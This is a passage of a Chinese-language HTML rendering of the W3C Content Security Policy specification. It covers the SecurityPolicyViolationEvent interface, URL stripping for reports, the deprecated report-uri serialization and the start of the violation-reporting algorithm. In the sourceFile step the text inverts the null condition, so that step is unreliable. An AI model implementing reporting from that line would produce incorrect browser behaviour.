    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑦"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-sourcefile"><code><c- g>sourceFile</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑦"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-securitypolicyviolationevent-sample"><code><c- g>sample</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition①"><c- n>SecurityPolicyViolationEventDisposition</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-securitypolicyviolationevent-disposition"><code><c- g>disposition</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short" id="ref-for-idl-unsigned-short①"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned short" id="dom-securitypolicyviolationevent-statuscode"><code><c- g>statusCode</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long②"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long" id="dom-securitypolicyviolationevent-linenumber"><code><c- g>lineNumber</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long③"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long" id="dom-securitypolicyviolationevent-columnnumber"><code><c- g>columnNumber</c-></code></dfn>;
};

<c- b>dictionary</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="dictionary" data-export id="dictdef-securitypolicyviolationeventinit"><code><c- g>SecurityPolicyViolationEventInit</c-></code></dfn> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#dictdef-eventinit" id="ref-for-dictdef-eventinit"><c- n>EventInit</c-></a> {
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑧"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-documenturi"><code><c- g>documentURI</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑨"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-referrer"><code><c- g>referrer</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①⓪"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-blockeduri"><code><c- g>blockedURI</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑧"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-violateddirective"><code><c- g>violatedDirective</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString⑨"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-effectivedirective"><code><c- g>effectiveDirective</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString①⓪"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①①"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="USVString" id="dom-securitypolicyviolationeventinit-sourcefile"><code><c- g>sourceFile</c-></code></dfn> = "";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString①①"><c- b>DOMString</c-></a>      <dfn class="dfn-paneled idl-code" data-default="&quot;&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="DOMString" id="dom-securitypolicyviolationeventinit-sample"><code><c- g>sample</c-></code></dfn> = "";
    <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition②"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="dfn-paneled idl-code" data-default="&quot;enforce&quot;" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="SecurityPolicyViolationEventDisposition" id="dom-securitypolicyviolationeventinit-disposition"><code><c- g>disposition</c-></code></dfn> = "enforce";
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short" id="ref-for-idl-unsigned-short②"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned short" id="dom-securitypolicyviolationeventinit-statuscode"><code><c- g>statusCode</c-></code></dfn> = 0;
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long④"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned long" id="dom-securitypolicyviolationeventinit-linenumber"><code><c- g>lineNumber</c-></code></dfn> = 0;
    <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long⑤"><c- b>unsigned</c-> <c- b>long</c-></a>  <dfn class="dfn-paneled idl-code" data-default="0" data-dfn-for="SecurityPolicyViolationEventInit" data-dfn-type="dict-member" data-export data-type="unsigned long" id="dom-securitypolicyviolationeventinit-columnnumber"><code><c- g>columnNumber</c-></code></dfn> = 0;
};
</pre>
            <h3 class="heading settled algorithm" data-algorithm="获取违规资源的 blockedURI" data-level="5.2"
                id="obtain-violation-blocked-uri"><span class="secno">5.2. </span><span
                    class="content">获取违规<var>resource</var>的 <code
                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-blockeduri" id="ref-for-dom-securitypolicyviolationevent-blockeduri">blockedURI</a></code></span><a
                    class="self-link" href="#obtain-violation-blocked-uri"></a></h3>
            <p>给定违规的<a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource①③">资源</a>
                <var>resource</var>，此算法返回一个<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                    id="ref-for-string⑨">字符串</a>，
                用作违规报告的阻止 URI 字段。
            </p>
            <ol>
                <li data-md>
                    <p class="assertion">断言：<var>resource</var> 是一个 <a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-url" id="ref-for-concept-url">URL</a> 或一个<a
                            data-link-type="dfn" href="https://infra.spec.whatwg.org/#string"
                            id="ref-for-string①⓪">字符串</a>。</p>
                </li>
                <li data-md>
                    <p>如果 <var>resource</var> 是一个 <a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-url" id="ref-for-concept-url①">URL</a>，则返回在
                        <var>resource</var> 上执行<a href="#strip-url-for-use-in-reports">§ 5.4 为在报告中使用而剥离 URL</a>的结果。
                    </p>
                </li>
                <li data-md>
                    <p>返回 <var>resource</var>。</p>
                </li>
            </ol>
            <h3 class="heading settled" data-level="5.3" id="deprecated-serialize-violation"><span class="secno">5.3.
                </span><span class="content">获取<var>violation</var>的已弃用序列化形式</span><a class="self-link"
                    href="#deprecated-serialize-violation"></a></h3>
            <p>给定一个<a data-link-type="dfn" href="#violation" id="ref-for-violation②①">violation</a>
                <var>violation</var>，该算法返回违规的 JSON 文本字符串表示形式，适合提交给与已弃用的<a data-link-type="dfn" href="#report-uri"
                    id="ref-for-report-uri"><code>report-uri</code></a>指令关联的报告端点。
            </p>
            <ol>
                <li data-md>
                    <p>让<var>body</var>是一个<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ordered-map"
                            id="ref-for-ordered-map">映射</a>，其键初始化如下：</p>
                    <dl>
                        <dt data-md>"<code>document-uri</code>"
                        <dd data-md>
                            <p>在<var>violation</var>的<a data-link-type="dfn" href="#violation-url"
                                    id="ref-for-violation-url">url</a>上执行<a href="#strip-url-for-use-in-reports">§ 5.4
                                    用于报告的 URL 剥离</a>的结果。</p>
                        <dt data-md>"<code>referrer</code>"
                        <dd data-md>
                            <p>在<var>violation</var>的<a data-link-type="dfn" href="#violation-referrer"
                                    id="ref-for-violation-referrer①">referrer</a>上执行<a
                                    href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>的结果。</p>
                        <dt data-md>"<code>blocked-uri</code>"
                        <dd data-md>
                            <p>在<var>violation</var>的<a data-link-type="dfn" href="#violation-resource"
                                    id="ref-for-violation-resource①④">resource</a>上执行<a
                                    href="#obtain-violation-blocked-uri">§ 5.2 获取违规资源的 blockedURI</a>的结果。</p>
                        <dt data-md>"<code>effective-directive</code>"
                        <dd data-md>
                            <p><var>violation</var>的<a data-link-type="dfn" href="#violation-effective-directive"
                                    id="ref-for-violation-effective-directive①">有效指令</a></p>
                        <dt data-md>"<code>violated-directive</code>"
                        <dd data-md>
                            <p><var>violation</var>的<a data-link-type="dfn" href="#violation-effective-directive"
                                    id="ref-for-violation-effective-directive②">有效指令</a></p>
                        <dt data-md>"<code>original-policy</code>"
                        <dd data-md>
                            <p><var>violation</var>的<a data-link-type="dfn" href="#violation-policy"
                                    id="ref-for-violation-policy①">policy</a>的<a data-link-type="dfn"
                                    href="#serialized-csp" id="ref-for-serialized-csp⑤">序列化</a></p>
                        <dt data-md>"<code>disposition</code>"
                        <dd data-md>
                            <p><var>violation</var>的<a data-link-type="dfn" href="#violation-policy"
                                    id="ref-for-violation-policy②">policy</a>的<a data-link-type="dfn"
                                    href="#policy-disposition" id="ref-for-policy-disposition①⑥">处理方式</a></p>
                        <dt data-md>"<code>status-code</code>"
                        <dd data-md>
                            <p><var>violation</var>的<a data-link-type="dfn" href="#violation-status"
                                    id="ref-for-violation-status①">状态</a></p>
                        <dt data-md>"<code>script-sample</code>"
                        <dd data-md>
                            <p><var>violation</var>的<a data-link-type="dfn" href="#violation-sample"
                                    id="ref-for-violation-sample④">样本</a></p>
                            <p class="note" role="note"><span class="marker">注意：</span><code>script-sample</code>
                                的名称是为了兼容 Firefox 自其初始实现 CSP 时的早期版本而选择的。尽管名称如此，该字段也会包含非脚本违规的样本，比如样式表。通过新的<a
                                    data-link-type="dfn" href="#report-to"
                                    id="ref-for-report-to"><code>report-to</code></a>指令生成的报告和<code
                                    class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent">SecurityPolicyViolationEvent</a></code>对象中的数据采用了更包容的命名方式：<code
                                    class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sample" id="ref-for-dom-securitypolicyviolationevent-sample">sample</a></code>。
                            </p>
                    </dl>
                <li data-md>
                    <p>如果<var>violation</var>的<a data-link-type="dfn" href="#violation-source-file"
                            id="ref-for-violation-source-file②">源文件</a>不是 null：</p>
                    <ol>
                        <li data-md>
                            <p>将<var>body</var>["<code>source-file</code>"] 设置为在<var>violation</var>的<a
                                    data-link-type="dfn" href="#violation-source-file"
                                    id="ref-for-violation-source-file③">源文件</a>上执行<a
                                    href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>的结果。</p>
                        <li data-md>
                            <p>将<var>body</var>["<code>line-number</code>"] 设置为<var>violation</var>的<a
                                    data-link-type="dfn" href="#violation-line-number"
                                    id="ref-for-violation-line-number①">行号</a>。</p>
                        <li data-md>
                            <p>将<var>body</var>["<code>column-number</code>"] 设置为<var>violation</var>的<a
                                    data-link-type="dfn" href="#violation-column-number"
                                    id="ref-for-violation-column-number①">列号</a>。</p>
                    </ol>
                <li data-md>
                    <p class="assertion">断言：如果<var>body</var>["<code>blocked-uri</code>"] 不是
                        "<code>inline</code>"，则<var>body</var>["<code>sample</code>"] 为空字符串。</p>
                <li data-md>
                    <p>返回使用<a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#serialize-an-infra-value-to-json-bytes"
                            id="ref-for-serialize-an-infra-value-to-json-bytes">将 infra 值序列化为 JSON 字节</a>给定 «[
                        "csp-report" → body ]» 的结果。</p>
            </ol>
            <h3 class="heading settled algorithm" data-algorithm="用于报告的 URL 剥离" data-level="5.4"
                id="strip-url-for-use-in-reports"><span class="secno">5.4. </span><span class="content">用于报告的 URL
                    剥离</span><a class="self-link" href="#strip-url-for-use-in-reports"></a></h3>
            <p>给定一个<a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url"
                    id="ref-for-concept-url②">URL</a> <var>url</var>，该算法返回一个用于违规报告的字符串形式的 URL：</p>
            <ol>
                <li data-md>
                    <p>如果<var>url</var>的<a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme"
                            id="ref-for-concept-url-scheme①">scheme</a>不是<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme②">HTTP(S)
                            scheme</a>，则返回<var>url</var>的<a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-url-scheme"
                            id="ref-for-concept-url-scheme②">scheme</a>。</p>
                <li data-md>
                    <p>将<var>url</var>的<a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-fragment"
                            id="ref-for-concept-url-fragment">fragment</a>设置为空字符串。</p>
                <li data-md>
                    <p>将<var>url</var>的<a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-username"
                            id="ref-for-concept-url-username">username</a>设置为空字符串。</p>
                <li data-md>
                    <p>将<var>url</var>的<a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-password"
                            id="ref-for-concept-url-password">password</a>设置为空字符串。</p>
                <li data-md>
                    <p>返回在<var>url</var>上执行<a data-link-type="dfn"
                            href="https://url.spec.whatwg.org/#concept-url-serializer"
                            id="ref-for-concept-url-serializer">URL 序列化器</a>的结果。</p>
            </ol>
            <h3 class="heading settled algorithm" data-algorithm="报告违规行为" data-level="5.5" id="report-violation"><span
                    class="secno">5.5. </span><span class="content">报告<var>violation</var></span><a class="self-link"
                    href="#report-violation"></a></h3>
            <p>给定一个<a data-link-type="dfn" href="#violation" id="ref-for-violation②②">violation</a>
                <var>violation</var>，该算法将其报告到<var>violation</var>的<a data-link-type="dfn" href="#violation-policy"
                    id="ref-for-violation-policy③">policy</a>中指定的端点，并在<var>violation</var>的<a data-link-type="dfn"
                    href="#violation-element" id="ref-for-violation-element①">element</a>，或如以下描述的<var>violation</var>的<a
                    data-link-type="dfn" href="#violation-global-object" id="ref-for-violation-global-object③">global
                    object</a>上触发<code
                    class="idl"><a data-link-type="idl" href="#securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent①">SecurityPolicyViolationEvent</a></code>。
            </p>
            <ol>
                <li data-md>
                    <p>令 <var>global</var> 为 <var>violation</var> 的 <a data-link-type="dfn"
                            href="#violation-global-object" id="ref-for-violation-global-object④">全局对象</a>。</p>
                <li data-md>
                    <p>令 <var>target</var> 为 <var>violation</var> 的 <a data-link-type="dfn" href="#violation-element"
                            id="ref-for-violation-element②">元素</a>。</p>
                <li data-md>
                    <p><a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#queue-a-task"
                            id="ref-for-queue-a-task">排入一个任务</a>来执行以下步骤：</p>
                    <p class="note" role="note"><span class="marker">注意：</span>我们在此处“排入任务”以确保事件目标和分发在负责某个违规的任务的
                        JavaScript 执行完成后发生（该任务可能会操作 DOM）。</p>
                    <ol>
                        <li data-md>
                            <p>如果 <var>target</var> 不为 null，且 <var>global</var> 是一个 <code
                                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window③">窗口对象（Window）</a></code>，并且
                                <var>target</var> 的 <a data-link-type="dfn"
                                    href="https://dom.spec.whatwg.org/#concept-shadow-including-root"
                                    id="ref-for-concept-shadow-including-root">包含 shadow 的根</a>不是 <var>global</var> 的 <a
                                    data-link-type="dfn"
                                    href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window"
                                    id="ref-for-concept-document-window②">关联的 <code>文档（Document）</code></a>，则将
                                <var>target</var> 设为 null。
                            </p>
                            <p class="note" role="note"><span class="marker">注意：</span>这样确保我们只在与 <var>violation</var> 的
                                <a data-link-type="dfn" href="#violation-policy" id="ref-for-violation-policy④">策略</a>的
                                <code
                                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document⑦">文档</a></code>连接的元素上触发事件。如果违规是由不连接到该文档的元素引起的，我们会在文档而非元素上触发事件，以确保违规对文档的监听器可见。
                            </p>
                        <li data-md>
                            <p>如果 <var>target</var> 为 null：</p>
                            <ol>
                                <li data-md>
                                    <p>将 <var>target</var> 设置为 <var>violation</var> 的<a data-link-type="dfn"
                                            href="#violation-global-object"
                                            id="ref-for-violation-global-object⑤">全局对象</a>。</p>
                                </li>
                                <li data-md>
                                    <p>如果 <var>target</var> 是一个 <code
                                            class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#window" id="ref-for-window④">Window</a></code>，
                                        则将 <var>target</var> 设置为 <var>target</var> 的<a data-link-type="dfn"
                                            href="https://html.spec.whatwg.org/multipage/nav-history-apis.html#concept-document-window"
                                            id="ref-for-concept-document-window③">关联的 <code>Document</code></a>。
                                    </p>
                                </li>
                            </ol>
                        <li data-md>
                            <p>如果 <var>target</var> <a data-link-type="dfn"
                                    href="https://webidl.spec.whatwg.org/#implements" id="ref-for-implements②">实现</a>
                                <code
                                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#eventtarget" id="ref-for-eventtarget">EventTarget</a></code>
                                接口，
                                则在 <var>target</var> 上<a data-link-type="dfn"
                                    href="https://dom.spec.whatwg.org/#concept-event-fire"
                                    id="ref-for-concept-event-fire">触发一个名为</a> <dfn class="dfn-paneled idl-code"
                                    data-dfn-for="GlobalEventHandlers,WorkerGlobalScope" data-dfn-type="event"
                                    data-export
                                    id="eventdef-globaleventhandlers-securitypolicyviolation"><code>securitypolicyviolation</code></dfn>
                                的事件，该事件使用 <code
                                    class="idl"><a data-link-type="idl" href="#securitypolicyviolationevent" id="ref-for-securitypolicyviolationevent②">SecurityPolicyViolationEvent</a></code>
                                接口，其属性初始化如下：
                            </p>
                            <dl>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-documenturi" id="ref-for-dom-securitypolicyviolationevent-documenturi">documentURI</a></code>
                                <dd data-md>
                                    <p>执行 <a href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>，传入
                                        <var>violation</var> 的 <a data-link-type="dfn" href="#violation-url"
                                            id="ref-for-violation-url①">URL</a>。
                                    </p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-referrer" id="ref-for-dom-securitypolicyviolationevent-referrer">referrer</a></code>
                                <dd data-md>
                                    <p>执行 <a href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>，传入
                                        <var>violation</var> 的 <a data-link-type="dfn" href="#violation-referrer"
                                            id="ref-for-violation-referrer②">引用者</a>。
                                    </p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-blockeduri" id="ref-for-dom-securitypolicyviolationevent-blockeduri①">blockedURI</a></code>
                                <dd data-md>
                                    <p>执行 <a href="#obtain-violation-blocked-uri">§ 5.2 获取违规资源的 blockedURI</a>，传入
                                        <var>violation</var> 的 <a data-link-type="dfn" href="#violation-resource"
                                            id="ref-for-violation-resource①⑤">资源</a>。
                                    </p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-effectivedirective" id="ref-for-dom-securitypolicyviolationevent-effectivedirective">effectiveDirective</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn"
                                            href="#violation-effective-directive"
                                            id="ref-for-violation-effective-directive③">有效指令</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-violateddirective" id="ref-for-dom-securitypolicyviolationevent-violateddirective">violatedDirective</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn"
                                            href="#violation-effective-directive"
                                            id="ref-for-violation-effective-directive④">有效指令</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-originalpolicy" id="ref-for-dom-securitypolicyviolationevent-originalpolicy">originalPolicy</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn" href="#serialized-csp"
                                            id="ref-for-serialized-csp⑥">CSP 序列化</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-disposition" id="ref-for-dom-securitypolicyviolationevent-disposition">disposition</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-disposition"
                                            id="ref-for-violation-disposition">处置</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sourcefile" id="ref-for-dom-securitypolicyviolationevent-sourcefile">sourceFile</a></code>
                                <dd data-md>
                                    <p>执行 <a href="#strip-url-for-use-in-reports">§ 5.4 用于报告的 URL 剥离</a>，传入
                                        <var>violation</var> 的 <a data-link-type="dfn" href="#violation-source-file"
                                            id="ref-for-violation-source-file④">源文件</a>，如果 <var>violation</var> 的 <a
                                            data-link-type="dfn" href="#violation-source-file"
                                            id="ref-for-violation-source-file⑤">源文件</a> 不为 null，则返回 null。
                                    </p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-statuscode" id="ref-for-dom-securitypolicyviolationevent-statuscode">statusCode</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-status"
                                            id="ref-for-violation-status②">状态码</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-linenumber" id="ref-for-dom-securitypolicyviolationevent-linenumber">lineNumber</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-line-number"
                                            id="ref-for-violation-line-number②">行号</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-columnnumber" id="ref-for-dom-securitypolicyviolationevent-columnnumber">columnNumber</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-column-number"
                                            id="ref-for-violation-column-number②">列号</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-sample" id="ref-for-dom-securitypolicyviolationevent-sample①">sample</a></code>
                                <dd data-md>
                                    <p><var>violation</var> 的 <a data-link-type="dfn" href="#violation-sample"
                                            id="ref-for-violation-sample⑤">示例</a></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-bubbles" id="ref-for-dom-event-bubbles">bubbles</a></code>
                                <dd data-md>
                                    <p><code>true</code></p>
                                <dt data-md><code
                                        class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-composed" id="ref-for-dom-event-composed">composed</a></code>
                                <dd data-md>
                                    <p><code>true</code></p>
                            </dl>
                            <p class="note" role="note"><span class="marker">注意：</span>我们设置了 <code
                                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-composed" id="ref-for-dom-event-composed①">composed</a></code>
                                属性，这意味着该事件可以在其进入的过程中被捕获，并会从 shadow 树中冒泡。<code
                                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#dom-event-target" id="ref-for-dom-event-target">target</a></code>
                                等将自动正确地作用于主树。</p>
                            <p class="note" role="note"><span class="marker">注意：</span> <code
                                    class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-effectivedirective" id="ref-for-dom-securitypolicyviolationevent-effectivedirective①">effectiveDirective</a></code>
                                和 <code
                                    class="idl"><a data-link-type="idl" href="#dom-securitypolicyviolationevent-violateddirective" id="ref-for-dom-securitypolicyviolationevent-violateddirective①">violatedDirective</a></code>
                                都是相同的值。这是为了保持向后兼容性而故意这样设计的。</p>
                        <li data-md>
                            <p>如果 <var>violation</var> 的<a data-link-type="dfn" href="#violation-policy"
                                    id="ref-for-violation-policy⑥">策略</a>的<a data-link-type="dfn"
                                    href="#policy-directive-set" id="ref-for-policy-directive-set①⓪">指令集</a>包含一个名为“<a
                                    data-link-type="dfn" href="#report-uri"
                                    id="ref-for-report-uri①"><code>report-uri</code></a>”的<a data-link-type="dfn"
                                    href="#directives" id="ref-for-directives①⑦">指令</a> <var>directive</var>：
                            </p>
                            <ol>
                                <li data-md>
                                    <p>如果 <var>violation</var> 的<a data-link-type="dfn" href="#violation-policy"
                                            id="ref-for-violation-policy⑦">策略</a>的<a data-link-type="dfn"
                                            href="#policy-directive-set"
                                            id="ref-for-policy-directive-set①①">指令集</a>包含一个名为“<a data-link-type="dfn"
                                            href="#report-to" id="ref-for-report-to①"><code>report-to</code></a>”的<a
                                            data-link-type="dfn" href="#directives"
                                            id="ref-for-directives①⑧">指令</a>，则跳过其余子步骤。</p>
                                </li>
                                <li data-md>
                                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                                            id="ref-for-list-iterate②⑦">对于</a> <var>directive</var> 的<a
                                            data-link-type="dfn" href="#directive-value"
                                            id="ref-for-directive-value①③">值</a>中的每个 <var>token</var>：
                                    </p>
                                    <ol>
                                        <li data-md>
                                            <p>令 <var>endpoint</var> 为以 <var>token</var> 作为输入，<var>violation</var> 的<a
                                                    data-link-type="dfn" href="#violation-url"
                                                    id="ref-for-violation-url②">url</a> 作为<a data-link-type="dfn"
                                                    href="https://url.spec.whatwg.org/#concept-base-url"
                                                    id="ref-for-concept-base-url">基本 URL</a> 执行<a data-link-type="dfn"
                                                    href="https://url.spec.whatwg.org/#concept-url-parser"
                                                    id="ref-for-concept-url-parser">URL 解析器</a>的结果。</p>
                                        </li>
                                        <li data-md>
                                            <p>如果 <var>endpoint</var> 不是有效的 URL，则跳过其余子步骤。
                                            </p>
                                        </li>
                                        <li data-md>
                                            <p>令 <var>request</var> 为一个新的<a data-link-type="dfn"
                                                    href="https://fetch.spec.whatwg.org/#concept-request"
                                                    id="ref-for-concept-request①⑥">请求</a>，初始化如下：
                                            </p>
                                            <dl>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-method"
                                                        id="ref-for-concept-request-method">方法</a>
                                                </dt>
                                                <dd data-md>
                                                    <p>"<code>POST</code>"</p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-url"
                                                        id="ref-for-concept-request-url④">url</a>
                                                </dt>
                                                <dd data-md>
                                                    <p><var>violation</var> 的<a data-link-type="dfn"
                                                            href="#violation-url" id="ref-for-violation-url③">url</a>
                                                    </p>
                                                </dd>
                                                <dt data-md><a data-link-type="dfn"
                                                        href="https://fetch.spec.whatwg.org/#concept-request-origin"
                                                        id="ref-for-concept-request-origin">源</a>
                                                </dt>
